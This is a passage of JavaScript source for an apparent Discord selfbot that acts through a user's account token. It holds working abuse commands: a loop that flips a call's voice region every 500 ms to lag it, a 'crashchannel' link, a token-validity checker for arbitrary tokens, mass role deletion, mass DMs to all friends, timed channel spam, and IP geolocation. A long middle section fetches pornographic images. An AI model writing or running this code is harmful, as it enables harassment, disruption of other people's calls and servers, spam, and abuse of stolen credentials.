                .addField("**```" + prefix + "crashchannel ```**", `***${language.CRASHCHANNEL_DESC}.***`)
                .addField("**```" + prefix + "iplookup + IP ```**", `***${language.IPLOOKUP_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            consolelog("information", `${language.DEBUG_LOG_HACK_SEND}.`)
        }

        if (cmd === "voclag") 
        {
            let vocalID = message.channel.id;
            if (message.channel.guild) return DoNotif(`${language.ERROR_COMMANDS_ONLY_DM_NOTIF}`);
            let vocid = args.slice(0).join(" ");
            message.delete()

            if (vocid === "stop") 
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```Vocal lag has been stopped. ✅```");
            }

            if (!interval) 
            {
                interval = setInterval(() => 
                {
                    var random_region = [utility_region.Brazil, utility_region.Europe, utility_region.Hongkong, utility_region.India, utility_region.Russia, utility_region.Sydney, utility_region.Uscentral][Math.floor(Math.random() * 7)]

                    var postData = 
                    {
                        region: random_region,
                    };
                    let axiosConfig = 
                    {
                        headers: 
                        {
                            'content-type': 'application/json',
                            'authorization': token
                        }
                    };
                    axios.patch(`https://discord.com/api/${Discord_Version}/channels/` + vocalID + '/call', postData, axiosConfig)
                }, 500);
            } 
            else 
            {
                message.channel.send('a loop is already running');
            };

            DoNotif("```Vocal lag has been started. ✅ for stop it type " + prefix + "voclag stop```");
        }

        if (cmd === "delroles") 
        {
            message.delete()

            DoNotif("```Roles successfully deleted. ✅```")
            message.guild.roles.forEach((role) => 
            {
                role.delete().then(() => 
                {

                }).catch(() => 
                {
                    DoNotif("```Roles impossible to delete. ❌```")
                });
            });
        }

        if (cmd === "delwebhook") 
        {
            message.delete()
            const webhook = args[0];

            snekfetch.delete(webhook)
                .then(r => 
                    {
                    if (r.status == 404) return DoNotif("```Webhook invalid. ❌```")
                    if (r.body.code == 10015) return DoNotif("```Webhook do not exist. ❌```")
                })

            DoNotif("```Webhook successfully deleted. ✅```")
        }

        if (cmd === "tokenchecker") 
        {
            var messageArray = message.content.split(" ");
            var argument1 = messageArray.slice(0);
        
            var argument = argument1[1]
            message.delete()
            if (!argument) return DoNotif(`${language.ERROR_COMMANDS_EMPTYMSG_NOTIF}`);
        
            let url = `https://discordapp.com/api/${Discord_Version}/users/@me`;
            request(
                url, {
                    method: "GET",
                    headers: {
                        authorization: argument
                    }
                },
                function(error, response, body) 
                {
                    if (response.statusCode === 200) 
                    {
                        var validtoken = new Discord.RichEmbed()
                        .setTitle("**「>> " + random_emojis + "「𝘾𝙝𝙚𝙘𝙠 𝙏𝙤𝙠𝙚𝙣」" + random_emojis + " <<」**")
                        .setColor(color)
                        .setThumbnail(client.user.displayAvatarURL)
                        .addField('The token is valid ! ✅', `► ${argument}`)
                        .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                        validtoken.setTimestamp();
            
                        message.channel.send(validtoken)
                    } 
                    else
                    {
                        var invalidtoken = new Discord.RichEmbed()
                        .setTitle("**「>> " + random_emojis + "「𝘾𝙝𝙚𝙘𝙠 𝙏𝙤𝙠𝙚𝙣」" + random_emojis + " <<」**")
                        .setColor(color)
                        .setThumbnail(client.user.displayAvatarURL)
                        .addField('The token is not valid ❌', `► ${argument}`)
                        .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                        invalidtoken.setTimestamp();
        
                        message.channel.send(invalidtoken)
                    }
                })
            }

            if (cmd === "crashchannel")
            {
                message.delete()
                return message.channel.send("https://images-ext-1.discordapp.net/external/YDAGZt1IbzdHfzMg8_6zIbWfCop3Snw7JVSfkGOUf0g/https/thumbs.gfycat.com/ColorfulRedFishingcat-poster.jpg?width=360&height=216")
            }

            if (cmd === "iplookup")
            {
                message.delete()
                const ip = args[1];
                var getip = ip
                snekfetch.get(`http://ip-api.com/json/${args}`).then(r =>
                {
                    var embed = new Discord.RichEmbed()
                    .setTitle('****「>> 🩸 IP LOOKUP 🩸 <<」****')  
                    .setColor(color)
                    .addField("**Looked Up IP:**", `${args}`)
                    .addField("Country:", `${r.body.country}`)
                    .addField("countryCode:", `${r.body.countryCode}`)
                    .addField("City:", `${r.body.city}`)
                    .addField("Region:", `${r.body.region}`)
                    .addField("region Name:", `${r.body.regionName}`)
                    .addField("ZIP:", `${r.body.zip}`)
                    .addField("ISP:", `${r.body.isp}`)
                    .addField("lat:", `${r.body.lat}`)
                    .addField("lon:", `${r.body.lon}`)
                    .addField("timezone:", `${r.body.timezone}`)
                    .addField("Organisation:", `${r.body.org}`)
                    .addField("AS:", `${r.body.as}`)
                    .setImage(image)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

                    message.channel.send({ embed: embed });
                })
            }

        //#endregion



        //#region > NSFW MENU & OPTIONS

        if (cmd === "nsfw") 
        {
            message.delete()

            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙉𝙎𝙁𝙒」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "hentai ```**", `***${language.HENTAI_DESC}.***`)
                .addField("**```" + prefix + "4k ```**", `***${language.FOURK_DESC}.***`)
                .addField("**```" + prefix + "hass ```**", `***${language.HASS_DESC}.***`)
                .addField("**```" + prefix + "hmidriff ```**", `***${language.HMIDRIFF_DESC}.***`)
                .addField("**```" + prefix + "pgif ```**", `**${language.PGIF_DESC}.***`)
                .addField("**```" + prefix + "holo ```**", `***${language.HOLO_DESC}.***`)
                .addField("**```" + prefix + "hneko ```**", `***${language.HNEKO_DESC}.***`)
                .addField("**```" + prefix + "neko ```**", `***${language.NEKO_DESC}.***`)
                .addField("**```" + prefix + "hkitsune ```**", `***${language.HKITSUNE_DESC}.***`)
                .addField("**```" + prefix + "kemonomimi ```**", `***${language.KEMONOMIMI_DESC}.***`)
                .addField("**```" + prefix + "anal ```**", `***${language.ANAL_DESC}.***`)
                .addField("**```" + prefix + "hanal ```**", `***${language.HANAL_DESC}.***`)
                .addField("**```" + prefix + "gonewild ```**", `***${language.GONEWILD_DESC}.***`)
                .addField("**```" + prefix + "kanna ```**", `***${language.KANNA_DESC}.***`)
                .addField("**```" + prefix + "ass ```**", `***${language.ASS_DESC}.***`)
                .addField("**```" + prefix + "pussy ```**", `***${language.PUSSY_DESC}.***`)
                .addField("**```" + prefix + "thigh ```**", `***${language.THIGH_DESC}.***`)
                .addField("**```" + prefix + "hthigh ```**", `***${language.HTHIGH_DESC}.***`)
                .addField("**```" + prefix + "paizuri ```**", `***${language.PAIZURI_DESC}.***`)
                .addField("**```" + prefix + "tentacle ```**", `***${language.TENTACLE_DESC}.***`)
                .addField("**```" + prefix + "boobs ```**", `***${language.BOOBS_DESC}.***`)
                .addField("**```" + prefix + "hboobs ```**", `***${language.HBOOBS_DESC}.***`)
                .addField("**```" + prefix + "yaoi ```**", `***${language.YAOI_DESC}.***`)
                .addField("**```" + prefix + "futanari ```**", `***${language.FUTANARI_DESC}.***`)
                .addField("**```" + prefix + "r34 + (ex: pussy, panties) ```**", `***${language.R34_DESC}.***`)

                const help1 = new Discord.RichEmbed()
                .setColor(color)
                .addField("**```" + prefix + "blowjob ```**", `***${language.BLOWJOB_DESC}.***`)
                .addField("**```" + prefix + "cumsluts ```**", `***${language.CUMSLUTS_DESC}.***`)
                .addField("**```" + prefix + "cumarts ```**", `***${language.CUMARTS_DESC}.***`)
                .addField("**```" + prefix + "feet ```**", `***${language.FEET_DESC}.***`)
                .addField("**```" + prefix + "feetgif ```**", `***${language.FEETGIF_DESC}.***`)
                .addField("**```" + prefix + "femdom ```**", `***${language.FEMDOM_DESC}.***`)
                .addField("**```" + prefix + "gasm ```**", `***${language.GASM_DESC}.***`)
                .addField("**```" + prefix + "kuni ```**", `***${language.KUNI_DESC}.***`)
                .addField("**```" + prefix + "lesbian ```**", `***${language.LESBIAN_DESC}.***`)
                .addField("**```" + prefix + "pussywank ```**", `***${language.PUSSYWANK_DESC}.***`)
                .addField("**```" + prefix + "tits ```**", `***${language.TITS_DESC}.***`)
                .addField("**```" + prefix + "trapnsfw ```**", `***${language.TRAPIMG_DESC}.***`)
                .addField("**```" + prefix + "yuri ```**", `***${language.YURI_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            message.channel.send(help1)
            consolelog("information", `${language.DEBUG_LOG_NSFW_SEND}.`)
        }

        if (cmd === "hentai") 
        {
            message.delete()
            HentaiIMG();

            async function HentaiIMG() {
                let img = await Nekow.get("hentai");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hentaii !**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "4k") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("4k");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**4K Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hass") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hass");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hass Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hmidriff") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hmidriff");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**hmidriff Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "pgif") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("pgif");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**pgif Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "holo") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("holo");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Holo Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hneko") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hneko");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hentai Neko Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "neko") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("neko");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Neko Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hkitsune") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hkitsune");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hkitsune Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "kemonomimi") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("kemonomimi");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Kemonomimi Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "anal") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("anal");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Anal Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hanal")
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hanal");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hanal Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "gonewild") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("gonewild");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Gonewild Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "kanna") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("kanna");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Kanna Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "ass") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("ass");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Ass Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "pussy") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("pussy");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Pussy Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "thigh") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("thigh");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Thigh Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hthigh") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hthigh");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hthigh Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "paizuri") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("paizuri");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Paizuri Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "tentacle") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("tentacle");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Tentacle Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "boobs") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("boobs");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Boobs Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hboobs") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hboobs");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hboobs Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "yaoi") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("yaoi");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Yaoi Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "futanari") 
        {
            message.delete()
            FutaIMG();

            async function FutaIMG() 
            {
                request('https://nekos.life/api/v2/img/futanari', function(error, response, html) {
                    if (!error && response.statusCode == 200) {
                        var $ = cheerio.load(html);
                        var TEXT = $.text()
                        var FIX1 = TEXT.replace('{"url":"', '')
                        var FIX2 = FIX1.replace('"}', '')

                        let embed = new Discord.RichEmbed()
                            .setColor(color)
                            .setTitle('**Futanari  !**')
                            .setImage(FIX2)
                            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                        embed.setTimestamp();

                        message.channel.send(embed)
                    }
                });
            }
        }

        if (cmd === "r34")
        {
            var query = message.content.split(/\s+/g).slice(1).join(" ");
            booru.search('rule34', [query], {nsfw: true, limit: 1, random: true })
                .then(booru.commonfy)
                .then(images => {
                    for (let image of images) 
                    {
                        const embed = new Discord.RichEmbed()
                        .setTitle("Rule34:")
                        .setImage(image.common.file_url)
                        .setColor(color)
                        .setFooter(`Tags: r34 ${query}`)
                        .setURL(image.common.file_url)
                        .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                    return message.channel.send({ embed });
                    }
          
                }).catch(err => 
                {
                    if (err.name === 'booruError') 
                    {
                        return message.channel.send(`No results found for **${query}**!`);
                    } else {
                        return message.channel.send(`No results found for **${query}**!`);
                    }
          })
        }

        if (cmd === "blowjob")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.blowJob());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "cumsluts")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.cumsluts());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "cumarts")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.cumArts());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "feet")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.feet());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "feetgif")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.feetGif());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "femdom")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.femdom());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "gasm")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.gasm());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "kuni")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.kuni());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "lesbian")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.lesbian());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "pussywank")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.pussyWankGif());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "tits")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.tits());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "trapnsfw")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.trap());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "yuri")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.yuri());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        //#endregion



        //#region > ACCOUNT MENU & OPTIONS

        if (cmd === "account") 
        {
            message.delete()

            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝘼𝙘𝙘𝙤𝙪𝙣𝙩」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "status ```**", `***${language.STATUS_DESC}.***`)
                .addField("**```" + prefix + "hypersquad + NUMBER ```**", `***${language.HYPERSQUAD_DESC}.***`)
                .addField("**```" + prefix + "changestatus + NUMBER ```**", `***${language.CHANGESTATUS_DESC}***`)
                .addField("**```" + prefix + "rdmnickname ```**", `***${language.RDM_NIKNAME_DESC}***`)
                .addField("**```" + prefix + "mee6rank ```**", `***${language.MEE6RANK_DESC}***`)
                .addField("**```" + prefix + "ghostmode ```**", `***${language.GHOSTMODE_DESC}***`)
                .addField("**```" + prefix + "dmfriends + MSG ```**", `***${language.DMFRIENDS_DESC}***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            consolelog("information", `${language.DEBUG_LOGS_ACCOUNT_SEND}.`)
        }

        if (cmd === "hypersquad") 
        {
            let number = args[0];
            message.delete()

            if (number === "1" || number === "2" || number === "3") 
            {
                var postData = 
                {
                    house_id: number,
                };

                let axiosConfig = 
                {
                    headers: 
                    {
                        'content-type': 'application/json',
                        'authorization': token
                    }
                };
                axios.post(`https://discord.com/api/${Discord_Version}/hypesquad/online`, postData, axiosConfig)

                return DoNotif("```Hypersquad " + number + " added. ✅```");
            } 
            else 
            {
                return DoNotif("```Choose a number for change your hypersquad: 1, 2 or 3. ❌```");
            }
        }

        if (cmd === "changestatus") 
        {
            let number = args[0];
            message.delete()

            if (number === "1" || number === "2" || number === "3" || number === "4") 
            {
                if (number === "1") 
                {
                    client.user.setStatus('online');
                } 
                else if (number === "2") 
                {
                    client.user.setStatus('idle');
                } 
                else if (number === "3") 
                {
                    client.user.setStatus('dnd');
                } 
                else if (number === "4") 
                {
                    client.user.setStatus('invisible');
                }
                return DoNotif("```Status changed. ✅```");
            } else {
                return DoNotif("```Choose a number for change your status: 1, 2, 3 or 4. ❌```");
            }
        }

        if (cmd === "rdmnickname")
        {
            let stopit = args[0];
            var server = message.guild;
            message.delete()

            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)
            if (stopit === "stop")
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```Random Nikname has been stopped. ✅```");
            }

            interval = setInterval(function() 
            {
                var TEXT = RDM_NICKNAME[Math.floor(Math.random() * RDM_NICKNAME.length)]
                message.guild.member(message.author).setNickname(TEXT);
            }, 3000);

            DoNotif("```Random nikname has been started. do " + prefix + "rdmnikname stop for stop it ✅```");
        }

        if (cmd === "mee6rank")
        {
            let stopit = args[0];
            var server = message.guild;
            message.delete()

            //return if using on DM channel
            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)

            //stop it if the user want to stop
            if (stopit === "stop")
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```Mee6 Rank has been stoped. ✅```");
            }

            interval = setInterval(function() 
            {
                var rdm_mess = ["Salut", "ça va ?", "Ne fait pas attention a moi", "Cool ce serveur", "bonjour à tous !"][Math.floor(Math.random() * 5)]
                message.channel.send(rdm_mess)
            }, 30000);

            DoNotif("```Mee6 Rank has been started. do " + prefix + "mee6rank stop for stop it ✅```");
        }

        if (cmd === "ghostmode")
        {
            var server = message.guild;
            message.delete()

            if (!server) return DoNotif(`${language.ERROR_COMMANDS_ONLY_SERVER_NOTIF}`)

            message.guild.member(message.author).setNickname("˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞").catch(error => {return DoNotif(language.ERROR_COMMANDS_OCCURED_NOTIF)})
            client.user.setStatus('invisible');
        }

        if (cmd === "dmfriends")
        {
            let msg = args.slice(0).join(" ");
            message.delete()

            if (!msg) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)
            
            client.user.friends.forEach(member => 
            {
                member.send(msg).catch(e => {});
            })
        }

        //#endregion
        


        //#region > STATUS MENU & OPTIONS

        if (cmd === "status")
        {
            message.delete()

            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙎𝙩𝙖𝙩𝙪𝙨」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "customstatus + TEXT ```**", `***${language.CUSTOMSTATUS_DESC}.***`)
                .addField("**```" + prefix + "multistatus ```**", `***${language.MULTISTATUS_DESC}.***`)
                .addField("**```" + prefix + "stream + TEXT ```**", `***${language.STREAM_DESC}.***`)
                .addField("**```" + prefix + "multistream ```**", `***${language.MULTISTEAM}.***`)
                .addField("**```" + prefix + "spotify + TEXT ```**", `***${language.SPOTIFY_DESC}***`)
                .addField("**```" + prefix + "customspotify + IMG + IMG + TIMESTAMP + TEXT ```**", `***${language.CUSTOMSPOTIFY_DESC}***`)
                .addField("**```" + prefix + "statustime + REGION ```**", `***${language.STATUSTIME_DESC}***`)
                .addField("**```" + prefix + "mediastatus ```**", `***${language.MEDIASTATUS_DESC}***`)
                .addField("**```" + prefix + "hentaistatus ```**", `***${language.HENTAISTATUS_DESC}***`)
                .addField("**```" + prefix + "resetstatus ```**", `***${language.RESETSTATUS_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            consolelog("information", `${language.DEBUG_LOGS_STATUS_SEND}.`)
        }

        if (cmd === "customstatus") 
        {
            let msg = args.slice(0).join(" ");

            let data = {};
            data.text = msg;
            //data.emoji_name = "KREmiliaRee";
            //data.emoji_id = "638554828309659658";

            let axiosConfig = {
                headers: {
                    'content-type': 'application/json',
                    'authorization': token
                }
            };
            axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, JSON.stringify({
                custom_status: data
            }), axiosConfig)
        }

        if (cmd === "multistatus") 
        {
            let amsg = args.slice(0).join(" ");
            message.delete()

            if (amsg === "stop") 
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```Multi status has been stopped. ✅```");
            }

            DoNotif("```Before using this multistatus, please join these servers for get the right emojis. ✅```")
